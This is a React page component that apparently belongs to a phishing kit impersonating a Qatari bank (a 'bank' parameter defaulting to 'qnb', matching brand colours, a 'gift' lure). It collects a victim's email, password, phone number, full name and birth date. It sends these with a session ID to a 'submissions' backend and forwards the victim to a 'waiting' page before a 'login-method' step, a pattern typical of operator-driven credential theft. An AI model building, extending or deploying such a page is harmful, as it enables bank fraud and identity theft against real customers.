import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";
import Header from "@/components/Header";
import { Eye, EyeOff, Check } from "lucide-react";
import translationData from "../../../../translation_data.json";

const getTranslatedData = (language: string, key: 'titles' | 'residence_countries' | 'phone_codes') => {
  return (translationData as any)[language][key];
};

const DAYS = Array.from({ length: 31 }, (_, i) => (i + 1).toString().padStart(2, '0'));
const MONTHS = Array.from({ length: 12 }, (_, i) => (i + 1).toString().padStart(2, '0'));
const YEARS = Array.from({ length: 100 }, (_, i) => (new Date().getFullYear() - i).toString());

export default function PersonalData() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const { language } = useLanguage();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "qnb";
  const sessionId = localStorage.getItem("sessionId") || "";

  const isArabic = language === "ar";
  const footerImage = isArabic 
    ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg"
    : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg";
  
  const titles = getTranslatedData(language, 'titles');
  const residenceCountries = getTranslatedData(language, 'residence_countries');
  const phoneCodes = getTranslatedData(language, 'phone_codes');

  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    confirmPassword: "",
    countryCode: isArabic ? "قطر (974)" : "Qatar (974)",
    phoneNumber: "",
    title: "",
    nameEnglish: "",
    middleName: "",
    lastName: "",
    birthDay: "",
    birthMonth: "",
    birthYear: "",
    gender: "",
    country: isArabic ? "قطر" : "Qatar",
    promoCode: "",
  });

  const submitPersonalDataMutation = trpc.submissions.submitPersonalData.useMutation();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
    
    if (!currentSessionId) {
      toast.error(isArabic ? "جلسة غير صالحة" : "Invalid session");
      return;
    }

    if (formData.password !== formData.confirmPassword) {
      toast.error(isArabic ? "كلمات المرور غير متطابقة" : "Passwords do not match");
      return;
    }

    const fullDob = `${formData.birthDay}/${formData.birthMonth}/${formData.birthYear}`;

    try {
      await submitPersonalDataMutation.mutateAsync({
        sessionId: currentSessionId,
        email: formData.email,
        password: formData.password,
        phoneNumber: `${formData.countryCode} ${formData.phoneNumber}`,
        title: formData.title,
        nameEnglish: formData.nameEnglish,
        middleName: formData.middleName,
        lastName: formData.lastName,
        dateOfBirth: fullDob,
        gender: formData.gender,
        country: formData.country,
        promoCode: formData.promoCode,
        nameArabic: "",
        idNumber: "",
      });
      
      toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
      const giftId = params.get("gift") || "";
      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}${giftId ? `&gift=${giftId}` : ''}&next=login-method`);
    } catch (error) {
      console.error("Error saving personal data:", error);
      toast.error(isArabic ? "فشل حفظ البيانات، يرجى المحاولة مرة أخرى" : "Failed to save data, please try again");
    }
  };

  return (
    <div dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #f4f4f4; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background-color: #ffffff; border-bottom: 2px solid #8C0032; position: relative; z-index: 1000; }
        .header-right { display: flex; align-items: center; gap: 15px; }
        .logo { height: 60px; background-color: white; padding: 0; }
        .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
        .lang-btn { background-color: #8C0032; color: #ffffff; border: none; padding: 8px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 14px; }
        .form-container { max-width: 500px; margin: 20px auto; padding: 20px; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; font-size: 14px; }
        .form-group input[type="email"], .form-group input[type="password"], .form-group input[type="text"], .form-group input[type="number"], .form-group select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
        .password-input-group { position: relative; }
        .toggle-password { position: absolute; top: 50%; transform: translateY(-50%); right: 10px; cursor: pointer; color: #8C0032; }
        .date-select-group { display: flex; gap: 10px; }
        .date-select-group select { flex: 1; }
        .gender-group { display: flex; gap: 20px; margin-top: 10px; }
        .gender-group label { display: flex; align-items: center; gap: 5px; font-weight: normal; }
        .gender-group input[type="radio"] { margin-right: 5px; }
        .submit-btn { width: 100%; padding: 12px; background-color: #8C0032; color: #ffffff; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background-color 0.3s ease; }
        .submit-btn:hover { background-color: #6a0026; }
        .footer-image { width: 100%; display: block; margin-top: 20px; object-fit: cover; }
      `}</style>
      <Header />
      <div className="form-container">
        <h2 style={{ textAlign: "center", color: "#8C0032", marginBottom: "20px" }}>{isArabic ? "البيانات الشخصية" : "Personal Details"}</h2>
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="email">{isArabic ? "البريد الإلكتروني" : "Email"}</label>
            <input type="email" id="email" name="email" value={formData.email} onChange={handleChange} required />
          </div>
          <div className="form-group password-input-group">
            <label htmlFor="password">{isArabic ? "كلمة المرور" : "Password"}</label>
            <input type={showPassword ? "text" : "password"} id="password" name="password" value={formData.password} onChange={handleChange} required />
            <span className="toggle-password" onClick={() => setShowPassword(!showPassword)}>
              {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
            </span>
          </div>
          <div className="form-group password-input-group">
            <label htmlFor="confirmPassword">{isArabic ? "تأكيد كلمة المرور" : "Confirm Password"}</label>
            <input type={showPassword ? "text" : "password"} id="confirmPassword" name="confirmPassword" value={formData.confirmPassword} onChange={handleChange} required />
            <span className="toggle-password" onClick={() => setShowPassword(!showPassword)}>
              {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
            </span>
          </div>
          <div className="form-group">
            <label htmlFor="countryCode">{isArabic ? "رمز الدولة" : "Country Code"}</label>
            <select id="countryCode" name="countryCode" value={formData.countryCode} onChange={handleChange} required>
              {phoneCodes.map((code, index) => (
                <option key={index} value={code}>{code}</option>
              ))}
            </select>
          </div>
          <div className="form-group">
            <label htmlFor="phoneNumber">{isArabic ? "رقم الهاتف" : "Phone Number"}</label>
            <input type="number" id="phoneNumber" name="phoneNumber" value={formData.phoneNumber} onChange={handleChange} required />
          </div>
          <div className="form-group">
            <label htmlFor="title">{isArabic ? "اللقب" : "Title"}</label>
            <select id="title" name="title" value={formData.title} onChange={handleChange} required>
              <option value="">{isArabic ? "اختر لقبك" : "Select your title"}</option>
              {titles.map((title, index) => (
                <option key={index} value={title}>{title}</option>
              ))}
            </select>
          </div>
          <div className="form-group">
            <label htmlFor="nameEnglish">{isArabic ? "الاسم الأول (باللغة الإنجليزية)" : "First Name (English)"}</label>
            <input type="text" id="nameEnglish" name="nameEnglish" value={formData.nameEnglish} onChange={handleChange} required />
          </div>
          <div className="form-group">
            <label htmlFor="middleName">{isArabic ? "الاسم الأوسط (باللغة الإنجليزية)" : "Middle Name (English)"}</label>
            <input type="text" id="middleName" name="middleName" value={formData.middleName} onChange={handleChange} />
          </div>
          <div className="form-group">
            <label htmlFor="lastName">{isArabic ? "اسم العائلة (باللغة الإنجليزية)" : "Last Name (English)"}</label>
            <input type="text" id="lastName" name="lastName" value={formData.lastName} onChange={handleChange} required />
          </div>
          <div className="form-group">
            <label>{isArabic ? "تاريخ الميلاد" : "Date of Birth"}</label>
            <div className="date-select-group">
              <select name="birthDay" value={formData.birthDay} onChange={handleChange} required>
                <option value="">{isArabic ? "اليوم" : "Day"}</option>
                {DAYS.map((day) => (
                  <option key={day} value={day}>{day}</option>
                ))}
              </select>
              <select name="birthMonth" value={formData.birthMonth} onChange={handleChange} required>
                <option value="">{isArabic ? "الشهر" : "Month"}</option>
                {MONTHS.map((month) => (
                  <option key={month} value={month}>{month}</option>
                ))}
              </select>
              <select name="birthYear" value={formData.birthYear} onChange={handleChange} required>
                <option value="">{isArabic ? "السنة" : "Year"}</option>
                {YEARS.map((year) => (
                  <option key={year} value={year}>{year}</option>
                ))}
              </select>
            </div>
          </div>
          <div className="form-group">
            <label>{isArabic ? "الجنس" : "Gender"}</label>
            <div className="gender-group">
              <label>
                <input type="radio" name="gender" value="Male" checked={formData.gender === "Male"} onChange={handleChange} required />
                {isArabic ? "ذكر" : "Male"}
              </label>
              <label>
                <input type="radio" name="gender" value="Female" checked={formData.gender === "Female"} onChange={handleChange} required />
                {isArabic ? "أنثى" : "Female"}
              </label>
            </div>
          </div>
          <div className="form-group">
            <label htmlFor="country">{isArabic ? "بلد الإقامة" : "Country of Residence"}</label>
            <select id="country" name="country" value={formData.country} onChange={handleChange} required>
              {residenceCountries.map((country, index) => (
                <option key={index} value={country}>{country}</option>
              ))}
            </select>
          </div>
          <div className="form-group">
            <label htmlFor="promoCode">{isArabic ? "الرمز الترويجي (اختياري)" : "Promo Code (Optional)"}</label>
            <input type="text" id="promoCode" name="promoCode" value={formData.promoCode} onChange={handleChange} />
          </div>
          <button type="submit" className="submit-btn">{isArabic ? "إرسال" : "Submit"}</button>
        </form>
      </div>
      <img src={footerImage} alt="Footer Banner" className="footer-image" />
    </div>
  );
}
